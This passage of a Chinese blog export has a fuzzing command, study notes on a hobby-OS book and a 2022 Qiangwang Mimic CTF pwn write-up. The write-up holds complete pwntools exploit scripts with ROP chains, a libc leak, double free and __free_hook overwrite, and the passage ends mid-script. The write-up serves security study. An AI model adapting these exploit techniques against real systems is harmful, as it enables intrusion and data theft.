 <use xlink:href="#E1-MJMATHI-78" x="9004" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="9577" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="9922" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="10473" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="10973" y="0"/>
 <use xlink:href="#E1-MJMATHI-78" x="11440" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="12012" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="12358" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="13130" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="14131" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="14601" y="0"/>
 <use xlink:href="#E1-MJMATHI-6D" x="15130" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="16009" y="0"/>
 <use xlink:href="#E1-MJMATHI-6C" x="16512" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="16811" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="17277" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="17969" y="0"/>
 <use xlink:href="#E1-MJMATHI-6D" x="18969" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="19848" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="20377" y="0"/>
 <use xlink:href="#E1-MJMATHI-74" x="20847" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="21208" y="0"/>
 <use xlink:href="#E1-MJMATHI-72" x="21675" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="22126" y="0"/>
 <use xlink:href="#E1-MJMATHI-6A" x="22627" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="23039" y="0"/>
 <use xlink:href="#E1-MJMATHI-67" x="23543" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="24023" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="24746" y="0"/>
 <use xlink:href="#E1-MJMATHI-6F" x="25747" y="0"/>
</g>
</svg>HOME/fuzzing_libexif/out/ -S fuzzer2 -- <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/bin/exif @@<br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230322165422138.png"><span class="image-caption">image-20230322165422138</span></p>
]]></content>
  </entry>
  <entry>
    <title>30天自制操作系统</title>
    <url>/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>希望通过这本书，建立起对操作系统的整体框架认知。   </p>
<h3 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h3><p>编辑二进制文件，使用的是 winhex，就不用作者那个工具了。整体敲下来，也不算很复杂，不过可以偷懒的，直接把作者的整个文件复制即可。但是总得有点参与感是吧，毕竟目前原理不懂，bat 文件也是写好的。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230303213753070.png"><span class="image-caption">image-20230303213753070</span></p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230303213801924.png"><span class="image-caption">image-20230303213801924</span></p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230303213719042.png"><span class="image-caption">image-20230303213719042</span></p>
<p>这里似乎是作者遗漏了，看 bat 文件就能明白，在 img 文件所在目录的上级目录中要存在 z_tools，复制过去即可，然后双击 !cons_nt.bat（其实就是在当前目录打开 cmd 窗口），调用 qemu 模拟 img 映像文件，成功输出了 hello，world。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230303220008078.png"><span class="image-caption">image-20230303220432692</span></p>
<p>进而用汇编写。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230303222541932.png"><span class="image-caption">image-20230303222541932</span></p>
<p>后续的也没什么新的，只是增加了注释。看的时候，感觉增加了不少知识，但是应该不久就会消失吧？hh~</p>
<h3 id="day-2"><a href="#day-2" class="headerlink" title="day 2"></a>day 2</h3><p>今天仍然是没什么内容，那就简单记录下我所不知道或者不清晰的知识吧：</p>
<ul>
<li>ORG 指令：告诉汇编器从哪个地址开始载入机器码。</li>
<li>HLT 指令：让 CPU 进入待机状态，当外部发生变化时（例如 IO 设备操作）才会继续执行程序。</li>
<li>0x7c00~0x7dff 是一个作为<strong>主引导记录</strong>（书上称为启动区，但是搜索之后这个才是现在的称呼）的扇区（512 字节，因为计算机读取硬盘区域，一次性就会读取 512 字节，主引导区以 0x55AA 结尾），存放启动程序加载器的区域，用于唤醒操作系统。</li>
</ul>
<p>然后就是 make 命令，见了挺多回的了（并没有自己写过，但是有依葫芦画瓢修改过），这次做下整理：</p>
<ul>
<li><p>make 会默认去寻找名叫<code>Makefile</code>或者<code>makefile</code>的文件，并且只能是这两个名字。</p>
</li>
<li><p>xxx : yyy 前者是要构建出的目标文件，后者是构建前者需要的依赖文件。在这句指令的下一行写入的是需要执行的命令，而这条命令的前面需要<strong>四个空格占位</strong>（这很关键，不然会报错的）</p>
</li>
<li><p>我们一般也可以指定 以下指令来帮助我们快速删除文件：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-meta-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean:</span><br>	rm -f xxx<br></code></pre></td></tr></table></figure>

<p>.PHONY 叫做伪目标，这样如果输入<code>make clean</code>，make 不会去寻找是否存在一个名叫 clean 的文件，而是去执行 clean 指令。</p>
</li>
<li><p>变量声明引用通过 <code>$()</code>，看代码：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><code class="hljs makefile">OBJ=xxx yyy zzz<br><span class="hljs-section">all: <span class="hljs-variable">$(OBJ)</span></span><br></code></pre></td></tr></table></figure>

<p>$(OBJ) 表示将 OBJ 的值代入到 all 的依赖文件去，这里也是一个小小的技巧：如果我们只是输入 make 指令，会默认去执行生成第一个文件，然后又因为会检查依赖文件是否存在，从而去生成依赖文件。所以这样编写，就可以只需要输入 make，完成一系列的操作。</p>
</li>
</ul>
<h3 id="day-3"><a href="#day-3" class="headerlink" title="day 3"></a>day 3</h3><p>磁头、柱面、扇区：</p>
<ul>
<li>一个磁盘（圆形）分为正反面称为磁头。</li>
<li>一个磁头以按照同心圆的方式一圈圈，由外向内的顺序划分出若干个柱面。</li>
<li>一个柱面内划分出若干个扇区。</li>
</ul>
<p>Makefile 改变内容的语法规则已在 day 2 说明，不再赘述了。</p>
<p>小小总结一下从书上得来的知识：</p>
<ol>
<li>操作系统是设备一通电就能运行的一段程序（个人理解）</li>
<li>BIOS 会读取磁盘的第一个扇区作为主引导记录，所以要在这个扇区里写入启动程序加载器。</li>
<li>启动程序加载器会被从磁盘读取到内存的 0x7c00~7dff 区域，然后在内存中执行，从而再将磁盘后续存储的操作系统读入到内存的中以启动操作系统，之后把操作权限给予操作系统。</li>
</ol>
<p>加载操作系统，跟上面的总结理解是一致的。处理十分直接，通过先定位加载的地址，然后使用 jmp 进行跳转。如果使用 winhex   处理的话，直接帮我们区分好了，很方便。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230304203430507.png"><span class="image-caption">image-20230304203430507</span></p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230304203533971.png"><span class="image-caption">image-20230304203533971</span></p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230304203442989.png"><span class="image-caption">image-20230304203442989</span></p>
<p>运行之后，也是如愿的一片漆黑的画面。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230304203628351.png"><span class="image-caption">image-20230304203628351</span></p>
<p>为了能够使用 C 语言进行编写，后续作者进行了一些处理，内联的具体操作不是很懂，跟熟知的编译流程有些不大一样，很多不认识的中间文件，但是作者也并未细说，就也不细究了，毕竟我的目的只是为了了解整个操作系统的框架，那今天就结束吧。</p>
<h3 id="day-4"><a href="#day-4" class="headerlink" title="day 4"></a>day 4</h3><p>主要是通过 BIOS 调用了显示器进行显示颜色，并且在汇编中已经指定了哪块内存是显存，之后也只要把需要显示的内容存放进显存，就会被显示出来。</p>
<p>虽然书上没办法显示，但是我的博客里是可以看出来的，因为显存换成了白色的颜色，所以呈现了白屏。因为我的能显示，那条纹的就不放上来了，hhh</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230305140625214.png"><span class="image-caption">image-20230305140625214</span></p>
<p>今天主要是介绍了一些 C 语言语法，新得的知识应该是：如果想要呈现一个图画，需要一个个像素点进行着色，然后再进行一定的排序，而如果要显示出任务栏这样的东西，则是使用深浅变化的颜色体现出层次感，那么接下来把最后的两张图放一下就过了吧~</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230305151617617.png"><span class="image-caption">image-20230305151617617</span></p>
<p>确实是有了点早期 windows 桌面的既视感。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230305151700726.png"><span class="image-caption">image-20230305151700726</span></p>
<h4 id="day-5"><a href="#day-5" class="headerlink" title="day 5"></a>day 5</h4><p>显示的字符按照最基础的像素点进行排布，例如构成 A 的像素点是需要着色的，而其他的点是无需着色的（显示一个 A，是需要在一个正方形内部进行设计的），做完之后放进显存，即可显示。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230320154735824.png"><span class="image-caption">image-20230320154735824</span></p>
<p>因此若是要设计出字体，如下图一般进行个性化的摆放设计，这样导入显存时就会呈现出来，当然下图是作者用一种字体，但是其他人是如何将这种形式转换成机器码就看每个人自身了。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230320161452187.png"><span class="image-caption">image-20230320161452187</span></p>
<p>因为是有工具可以处理上述的字体，将其与其他的目标文件相链接，所以作者可以在 C 语言中通过 extern 访问到。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230320162150236.png"><span class="image-caption">image-20230320162150236</span></p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230320162231311.png"><span class="image-caption">image-20230320162231311</span></p>
<p>接下来是将其封装为一个函数，提高复用时的效率问题以及调用了 sprintf 进行打印变量值的处理，就不放图片了，没什么改变的。不过作者还是再三的强调了除了 sprintf 外的 printf 家族都会调用操作系统的功能，可以解读出来，我们通常见到的 stdout、stdin、stderr 都是鉴于操作系统进行定义的。而只有对内存的操作才是最本质的（所有程序运行的根本条件就是存在了内存的概念），可以很容易的对其进行操作。</p>
<p>制作鼠标这个点，hhh，让人恍然大悟：原来这些东西都是这么来的。看这个循环就很能体会到了，大的东西拆解开的时候，本质都是简单（我随便说说的）：用一些符号去描述出鼠标的形状，然后对其循环遍历，对每个位填充上不同的颜色，鼠标的形状之外（因为是要在一个正方形内去设计）显出背景的底色，看看自己的鼠标，这很合理。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230320163749665.png"><span class="image-caption">image-20230320163749665</span></p>
<p>跟上面那些符号构成的图案是一致的，只是下面有进行上色。</p>
<p><img src="/2023/03/03/2023-03-03-30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20230320164629089.png"><span class="image-caption">image-20230320164629089</span></p>
<p>最后是让鼠标动起来，可惜今天还没实现，但是有新增的知识：</p>
<ul>
<li>首先是分段，32 位系统仍然需要段寄存器指定起始地址，但是段寄存器只有13 位可写，因此用这 13 位去保存 0~8191 的段号，而每个段号对应的段起始地址则存放在某段内存中，这些地址数据（8192 * 8 = 65536 = 64KB）被称作 GDT（global (segment) descriptor table 全局段号记录表）。而存放段起始地址的内存地址以及有效个数则被存放在 GDTR 寄存器中。</li>
<li>IDT（interrupt descriptor table 中断记录表）记录了 0~255 的中断号码与调用函数的对应关系。中断的是一种十分正常的机制，用于去处理硬件（外部中断）与软件（内部中断）的输入输出处理。</li>
</ul>
<p>代码部分则是多了对于 GDT 和 IDT 的初始化，确立好他们在内存的位置</p>
<h4 id="day-6"><a href="#day-6" class="headerlink" title="day 6"></a>day 6</h4>]]></content>
  </entry>
  <entry>
    <title>2022强网拟态</title>
    <url>/2022/11/17/2022-11-17-2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    <content><![CDATA[<h2 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h2><p>可以通过 close(0)，使得打开 flag 文件时，分配到的 fd 为0，从而绕过 5 的限制，读取 flag。</p>
<p><img src="/2022/11/17/2022-11-17-2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20221117135727016.png"><span class="image-caption">image-20221117135727016</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    <span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)</span><br>    <span class="hljs-comment">#ld = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so&quot;)</span><br>    <span class="hljs-comment">#p = process(argv=[ld.path,elf.path], env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;172.51.243.161&#x27;</span><br>    port = <span class="hljs-number">9999</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	<span class="hljs-comment">#gdb.attach(p, info)</span><br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x17e3)&quot;)</span><br>    gdb.attach(p, <span class="hljs-string">&quot;b *$rebase(0x18cd)&quot;</span>)<br><br><br>p.recvuntil(<span class="hljs-string">b&#x27;BF_PARSER&gt;&gt;\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">0x238</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span><br>payload += <span class="hljs-string">b&#x27;&lt;&#x27;</span>*<span class="hljs-number">0x25</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;.&#x27;</span><br>payload += <span class="hljs-string">b&#x27;&lt;&#x27;</span>*<span class="hljs-number">5</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>    payload += <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span><br><span class="hljs-comment">#debug()</span><br>p.send(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x24083</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak) <br>pie = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1955</span><br>log.info(<span class="hljs-string">&quot;pie==&gt;0x%x&quot;</span> %pie)<br>pop_rdi = <span class="hljs-number">0x0000000000023b6a</span> + leak<br>pop_rsi = <span class="hljs-number">0x000000000002601f</span> + leak<br>pop_rdx = <span class="hljs-number">0x0000000000142c92</span> + leak<br>ret = <span class="hljs-number">0x0000000000022679</span> + leak<br>read = leak + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss = <span class="hljs-number">0x0000000000008060</span> + pie<br><span class="hljs-built_in">open</span> = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>] + leak<br>close = leak + libc.sym[<span class="hljs-string">&#x27;close&#x27;</span>]<br>write = leak + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload2 = p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(<span class="hljs-number">8</span>) + p64(read)<br>payload2 += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(close)<br>payload2 += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload2 += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(<span class="hljs-number">50</span>) + p64(read)<br>payload2 += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(<span class="hljs-number">50</span>) + p64(write)<br>p.send(payload2)<br>sleep(<span class="hljs-number">0.5</span>)<br>p.send(<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><p>因为这题涉及到爆破，概率为 1/256 ；为了复现方便，所以选择关闭 ASLR 。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>

<p>这边有个点，要看出来题才有办法做：如果堆块存在则可以使用这个功能对堆块的内容清空，所以借此可以形成 double free，之后就是利用 seccomp 会产生很多的堆块来进行后续的利用。</p>
<p><img src="/2022/11/17/2022-11-17-2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230118234059687.png"><span class="image-caption">image-20230118234059687</span></p>
<p><img src="/2022/11/17/2022-11-17-2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230118234024015.png"><span class="image-caption">image-20230118234024015</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./only&#x27;</span>)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./only&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;127&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt;&gt; &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Content:&quot;</span>)<br>    p.send(content)	<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt;&gt; &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gift</span>():</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice &gt;&gt; &quot;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br><br><br>add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>free()<br>gift()<br>free()<br>add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\xf0\x97\n&#x27;</span>)<br>add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\xf0\x97\n&#x27;</span>)<br>add(<span class="hljs-number">0xe0</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x491</span>) + <span class="hljs-string">b&#x27;\x00\x98\n&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free()<br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\xa0\xa6\n&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00\n&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ec980</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br><br>free_hook = leak + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">open</span> = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>] + leak<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + leak <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + leak<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + leak<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + leak<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + leak<br>pop_rdx = <span class="hljs-number">0x0000000000142c92</span> + leak <span class="hljs-comment"># pop rdx ; ret</span><br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + leak<br>gadget1 = <span class="hljs-number">0x0000000000151990</span> + leak <span class="hljs-comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>gadget2 = <span class="hljs-number">0x000000000005b4d0</span> + leak <span class="hljs-comment"># mov rsp, rdx ; ret</span><br><br><br>add(<span class="hljs-number">0xe0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x81</span>) + p64(free_hook) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>payload = p64(gadget1) + p64(free_hook + <span class="hljs-number">0x10</span>) + p64(leak + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(gadget2) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>add(<span class="hljs-number">0x70</span>, payload)<br><span class="hljs-comment"># debug()</span><br>free()<br><br>rop = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>rop += p64(pop_rdi) + p64(free_hook + <span class="hljs-number">0x10</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(free_hook) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) +  p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(free_hook) + p64(pop_rdx) + p64(<span 